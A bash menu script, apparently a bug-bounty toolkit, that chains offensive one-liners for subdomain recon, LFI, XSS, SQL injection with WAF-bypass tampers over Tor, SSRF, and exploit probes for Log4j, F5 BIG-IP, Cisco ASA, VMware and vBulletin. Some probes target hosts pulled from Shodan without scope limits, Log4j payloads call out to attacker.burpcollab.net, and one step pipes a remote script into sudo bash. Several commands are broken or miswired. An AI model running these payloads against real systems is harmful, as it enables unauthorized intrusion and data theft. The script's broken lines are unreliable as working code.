#!/bin/bash

# Função para exibir o menu
show_menu() {
    echo "Escolha uma opção:"
    echo "1) Subdomain Enumeration"
    echo "2) Juicy Subdomains"
    echo "3) Subdomain Takeover"
    echo "4) LFI"
    echo "5) Open Redirect"
    echo "6) SSRF"
    echo "7) XSS"
    echo "8) Hidden Dirs"
    echo "9) Search for Sensitive files from Wayback"
    echo "10) SQLi"
    echo "11) Scan multiple hosts parallely"
    echo "12) Bypass WAF using TOR"
    echo "13) CORS"
    echo "14) Prototype Pollution"
    echo "15) CVEs"
    echo "16) RCE"
    echo "17) Find JS Files"
    echo "18) Extract sensitive end-point in JS"
    echo "19) SSTI"
    echo "20) HeartBleed"
    echo "21) Scan IPs"
    echo "22) Portscan"
    echo "23) Screenshots using Nuclei"
    echo "24) IPs from CIDR"
    echo "25) SQLmap Tamper Scripts - WAF bypass"
    echo "26) Shodan Cli"
    echo "27) Ffuf.json to only ffuf-url.txt"
    echo "28) Recon Oneliner from Stok"
    echo "29) Update golang"
    echo "30) Censys CLI"
    echo "31) Nmap cidr to ips.txt"
    echo "32) Xray urls scan"
    echo "33) Enumerate all domains from chaos db"
    echo "34) Enumerate bug bounty targets"
    echo "35) Sair"
}

# Funções para cada operação
subdomain_enumeration() {
    read -p "Digite o domínio alvo (ex: example.com): " domain
    subfinder -d $domain -all | anew subs.txt
    shuffledns -d $domain -r resolvers.txt -w n0kovo_subdomains_huge.txt | anew subs.txt
    dnsx -l subs.txt -r resolvers.txt | anew resolved.txt
    naabu -l resolved.txt -nmap -rate 5000 | anew ports.txt
    httpx -l ports.txt | anew alive.txt
    katana -list alive.txt -kf all -jc | anew urls.txt
    nuclei -l urls.txt -es info, unknown -ept ssl -ss template-spray | anew nuclei.txt
}

juicy_subdomains() {
    read -p "Digite o domínio alvo (ex: example.com): " domain
    subfinder -d $domain -silent | dnsx -silent | cut -d ' ' -f1 | grep --color 'api\|dev\|stg\|test\|admin\|demo\|stage\|pre\|vpn'
}

subdomain_takeover() {
    cat subs.txt | xargs -P 50 -I % bash -c "dig % | grep CNAME" | awk '{print $1}' | sed 's/\.$//g' | httpx -silent -status-code -cdn -csp-probe -tls-probe
}

lfi() {
    cat targets.txt | (gau || hakrawler || waybackurls || katana) | gf lfi | httpx -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST -tech-detect -status-code -follow-redirects -mc 200 -mr "root:[x*]:0:0:"
    cat targets.txt | (gau || hakrawler || waybackurls || katana) | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
    cat targets.txt | while read host; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n"; done
}

open_redirect() {
    echo target.com | (gau || hakrawler || waybackurls || katana) | grep -a -i =http | qsreplace 'http://evil.com' | while read host; do curl -s -L $host -I| grep "http://evil.com" && echo -e "$host \033[0;31mVulnerable\n"; done
    cat subs.txt | (gau || hakrawler || waybackurls || katana) | gf redirect | qsreplace 'http://example.com' | httpx -fr -title -match-string 'Example Domain'
}

ssrf() {
    cat urls.txt | gf ssrf | sort -u | anew | httpx | qsreplace 'burpcollaborator_link' | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %"'
    cat urls.txt | grep "=" | qsreplace "burpcollaborator_link" >> ssrf.txt
    ffuf -c -w ssrf.txt -u FUZZ
}

xss() {
    file=$1
    key="API_KEY"
    while read line; do curl https://api.knoxss.pro -d target=$line -H "X-API-KEY: $key" -s | grep PoC; done < $file
    cat domains.txt | (gau || hakrawler || waybackurls || katana) | grep -Ev "\.(jpeg|jpg|png|ico)$" | uro | grep = | qsreplace "<img src=x onerror=alert(1)>" | httpx -silent -nc -mc 200 -mr "<img src=x onerror=alert(1)>"
    echo target.com | (gau || hakrawler || waybackurls || katana) | grep '=' | qsreplace hack\" -a | while read url; do target-$(curl -s -l $url | egrep -o '(hack" | hack\\")'); echo -e "Target : \e[1;33m $url\e[om" "$target" "\n -"; done I sed 's/hack"/[xss Possible] Reflection Found/g'
    cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/?name={{this.constructor.constructor('alert(\"foo\")')()}}" -mr "name={{this.constructor.constructor('alert("
    cat targets.txt | (gau || hakrawler || waybackurls || katana) | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
    echo target.com | (gau || hakrawler || waybackurls || katana) | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31mVulnerable"; done
    cat urls.txt | grep "=" | sed 's/=.*/=/' | sed 's/URL: //' | tee testxss.txt
    dalfox file testxss.txt -b yours.xss.ht
    cat targets.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javascript:alert(1)"
    cat subs.txt | awk '{print $3}' | httpx -silent | xargs -I@ sh -c 'python3 http://xsstrike.py -u @ --crawl'
}

hidden_dirs() {
    dirsearch -l urls.txt -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --deep-recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o output.txt
    ffuf -c -w urls.txt:URL -w wordlist.txt:FUZZ -u URL/FUZZ -mc all -fc 500,502 -ac -recursion -v -of json -o output.json
    cat output.json | jq | grep -o '"url": ".*"' | grep -o 'https://[^"]*'
}

search_sensitive_files() {
    echo target.com | (gau || hakrawler || waybackurls || katana) | grep --color -E ".xls|\\.xml|\\.xlsx|\\.json|\\.pdf|\\.sql|\\.doc|\\.docx|\\.pptx|\\.txt|\\.zip|\\.tar.gz|\\.tgz|\\.bak|\\.7z|\\.rar"
    cat hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/s/123cfx/_/;/WEB-INF/classes/seraph-config.xml" -mc 200
}

sqli() {
    cat subs.txt | httpx -silent | anew | waybackurls | gf sqli >> sqli.txt
    sqlmap -m sqli.txt --batch --random-agent --level 5 --risk 3 --dbs
    cat urls.txt | parallel -j 50 'ghauri -u "{}" --dbs --hostname --confirm --batch'
}

bypass_waf_using_tor() {
    sqlmap -r request.txt --time-sec=10 --tor --tor-type=SOCKS5 --check-tor --dbs --random-agent
}

cors() {
    echo target.com | (gau || hakrawler || waybackurls || katana) | while read url; do
        target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url)
        if grep 'https://evil.com'; then
            echo "$url [Potential CORS Found]"
        else
            echo "Nothing on $url"
        fi
    done
}

prototype_pollution() {
    subfinder -d target.com -all -silent | httpx -silent -threads 100 | anew alive.txt
    sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"
}

cves() {
    cve_2020_5902
    cve_2020_3452
    cve_2021_44228
    cve_2022_0378
    cve_2022_22954
    cve_2022_41040
}

cve_2020_5902() {
    shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host; do
        curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && echo "$host [Vulnerable]" || echo "$host [Not Vulnerable]"
    done
}

cve_2020_3452() {
    while read LINE; do
        curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo "$LINE [VULNERABLE]" || echo "$LINE [NOT VULNERABLE]"
    done < domain_list.txt
}

cve_2021_44228() {
    cat subs.txt | while read host; do
        curl -sk --insecure --path-as-is "$host/?test=\${jndi:ldap://log4j.requestcatcher.com/a}" -H "X-Api-Version: \${jndi:ldap://log4j.requestcatcher.com/a}" -H "User-Agent: \${jndi:ldap://log4j.requestcatcher.com/a}"
    done
    cat urls.txt | sed 's/https:\/\///' | xargs -I {} echo '{}/\${jndi:ldap://attacker.burpcollab.net}' >> log4j.txt
}

cve_2022_0378() {
    cat URLs.txt | while read h; do
        curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3Dalert(1)+xx=%22test&from_url=x" | grep -qs "onmouse" && echo "$h: VULNERABLE"
    done
}

cve_2022_22954() {
    cat urls.txt | while read h; do
        curl -sk --path-as-is "$h/catalog-portal/ui/oauth/verify?error=&deviceUdid=\${\"freemarker.template.utility.Execute\"?new()(\"cat /etc/hosts\")}" | grep "context" && echo "$h [VULNERABLE]" || echo "$h [NOT VULNERABLE]"
    done
}

cve_2022_41040() {
    ffuf -w "urls.txt:URL" -u "https://URL/autodiscover/autodiscover.json?@URL/&Email=autodiscover/autodiscover.json%3f@URL" -mr "IIS Web Core" -r
}

rce() {
    cat targets.txt | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80,443,8080,8443 -mr "uid=" -silent
    shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host; do
        curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && echo "$host [VULNERABLE]" || echo "$host [NOT VULNERABLE]"
    done
    subfinder -d target.com | (gau || hakrawler || waybackurls || katana) | qsreplace "aaa%20%7C%7C%20id%3B%20x" > fuzzing.txt
    ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
}

find_js_files() {
    echo target.com | (gau || hakrawler || waybackurls || katana) | grep -iE '.js' | grep -iEv '(.jsp|.json)' | anew js.txt
    subfinder -d target.com | (gau || hakrawler || waybackurls || katana) | egrep -v '(.css|.svg)' | while read url; do
        vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,var,"'$url'?",g -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g')
        echo -e "\e[1;33m$url\n\e[1;32m$vars"
    done
}

extract_sensitive_endpoints_js() {
    cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
}

ssti() {
    for url in $(cat targets.txt); do
        python3 tplmap.py -u $url
        echo $url
    done
}

heartbleed() {
    cat urls.txt | while read line; do
        echo "QUIT" | openssl s_client -connect $line:443 2>&1 | grep 'server extension "heartbeat" (id=15)' || echo $line
    done
}

scan_ips() {
    cat my_ips.txt | xargs -L 100 shodan scan submit --wait 0
}

portscan() {
    naabu -l targets.txt -rate 3000 -retries 3 -warm-up-time 0 -rate 150 -c 50 -ports 1-65535 -o out.txt
}

screenshots_using_nuclei() {
    nuclei -l target.txt -headless -t nuclei-templates/headless/screenshot.yaml -v
}

ips_from_cidr() {
    echo cidr | httpx -t 100 | nuclei -id ssl-dns-names | cut -d " " -f7 | cut -d "]" -f1 | sed 's/[//' | sed 's/,/\n/g' | sort -u
}

sqlmap_tamper_scripts() {
    sqlmap -u 'http://www.site.com/search.cmd?form_state=1' --level=5 --risk=3 --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --no-cast --no-escape --dbs --random-agent
}

shodan_cli() {
    shodan search Ssl.cert.subject.CN:"target.com" --fields ip_str | anew ips.txt
}

ffuf_json_to_url() {
    cat ffuf.json | jq | grep "url" | sed 's/"//g' | sed 's/url://g' | sed 's/^ *//' | sed 's/,//g'
}

recon_oneliner_from_stok() {
        subfinder -d target.com -silent | anew target-subs.txt | dnsx -resp -silent | anew target-alive-subs-ip.txt | awk '{print $1}' | anew target-alive-subs.txt
    naabu -top-ports 1000 -silent | anew target-openports.txt | cut -d ":" -f1 | naabu -passive -silent | anew target-openports.txt
    httpx -silent -title -status-code -mc 200,403,400,500 | anew target-web-alive.txt | awk '{print $1}'
    gospider -t 10 -q -o targetcrawl | anew target-crawled.txt | unfurl format %s://dtp | httpx -silent -title -status-code -mc 403,400,500 | anew target-crawled-interesting.txt | awk '{print $1}'
    gau --blacklist eot,svg,woff,ttf,png,jpg,gif,otf,bmp,pdf,mp3,mp4,mov --subs | anew target-gau.txt | httpx -silent -title -status-code -mc 200,403,400,500 | anew target-web-alive.txt
    awk '{print $1}' | nuclei -eid expired-ssl,tls-version,ssl-issuer,deprecated-tls,revoked-ssl-certificate,self-signed-ssl,kubernetes-fake-certificate,ssl-dns-names,weak-cipher-suites,mismatched-ssl-certificate,untrusted-root-certificate,metasploit-c2,openssl-detect,default-ssltls-test-page,wordpress-really-simple-ssl,wordpress-ssl-insecure-content-fixer,cname-fingerprint,mx-fingerprint,txt-fingerprint,http-missing-security-headers,nameserver-fingerprint,caa-fingerprint,ptr-fingerprint,wildcard-postmessage,symfony-fosjrouting-bundle,exposed-sharepoint-list,CVE-2022-1595,CVE-2017-5487,weak-cipher-suites,unauthenticated-varnish-cache-purge,dwr-index-detect,sitecore-debug-page,python-metrics,kubernetes-metrics,loqate-api-key,kube-state-metrics,postgres-exporter-metrics,CVE-2000-0114,node-exporter-metrics,kube-state-metrics,prometheus-log,express-stack-trace,apache-filename-enum,debug-vars,elasticsearch,springboot-loggers -ss template-spray | notify -silent
}

update_golang() {
    curl https://raw.githubusercontent.com/udhos/update-golang/master/update-golang.sh | sudo bash
}

censys_cli() {
    censys search "target.com" --index-type hosts | jq -c '.[] | {ip: .ip}' | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+'
}

nmap_cidr_to_ips() {
    cat cidr.txt | xargs -I @ sh -c 'nmap -v -sn @ | egrep -v "host down" | grep "Nmap scan report for" | sed 's/Nmap scan report for //g' | anew nmap-ips.txt'
}

xray_urls_scan() {
    for i in $(cat subs.txt); do
        ./xray_linux_amd64 ws --basic-crawler $i --plugins xss,sqldet,xxe,ssrf,cmd-injection,path-traversal --ho $(date +"%T").html
    done
}

enumerate_all_domains_from_chaos_db() {
    curl https://chaos-data.projectdiscovery.io/index.json | jq -M '.[] | .URL | @sh' | xargs -I@ sh -c 'wget @ -q'
    mkdir bounty
    unzip '*.zip' -d bounty/
    rm -rf *zip
    cat bounty/*.txt >> allbounty
    sort -u allbounty >> domainsBOUNTY
    rm -rf allbounty bounty/
}

enumerate_bug_bounty_targets() {
    wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv
}

grep_nuclei_info() {
    result=$(sed -n 's/^\([^ ]*\) \([^ ]*\) \([^ ]*\) \([^ ]*\).*/\1 \2 \3 \4/p' file.txt)
    echo "$result"
}

download_js_files() {
    mkdir -p js_files
    while IFS= read -r url || [ -n "$url" ]; do
        filename=$(basename "$url")
        echo "Downloading $filename JS..."
        curl -sSL "$url" -o "downloaded_js_files/$filename"
    done < "$1"
    echo "Download complete."
}

# Menu interativo
while true; do
    show_menu
    read -p "Escolha uma opção: " choice
    case $choice in
        1) subdomain_enumeration ;;
        2) juicy_subdomains ;;
        3) subdomain_takeover ;;
        4) lfi ;;
        5) open_redirect ;;
        6) ssrf ;;
        7) xss ;;
        8) hidden_dirs ;;
        9) search_sensitive_files ;;
        10) sqli ;;
        11) scan_ips ;;
        12) bypass_waf_using_tor ;;
        13) cors ;;
        14) prototype_pollution ;;
        15) cves ;;
        16) rce ;;
        17) find_js_files ;;
        18) extract_sensitive_endpoints_js ;;
        19) ssti ;;
        20) heartbleed ;;
        21) scan_ips ;;
        22) portscan ;;
        23) screenshots_using_nuclei ;;
        24) ips_from_cidr ;;
        25) sqlmap_tamper_scripts ;;
        26) shodan_cli ;;
        27) ffuf_json_to_url ;;
        28) recon_oneliner_from_stok ;;
        29) update_golang ;;
        30) censys_cli ;;
        31) nmap_cidr_to_ips ;;
        32) xray_urls_scan ;;
        33) enumerate_all_domains_from_chaos_db ;;
        34) enumerate_bug_bounty_targets ;;
        35) echo "Saindo..." ; exit ;;
        *) echo "Opção inválida, tente novamente." ;;
    esac
done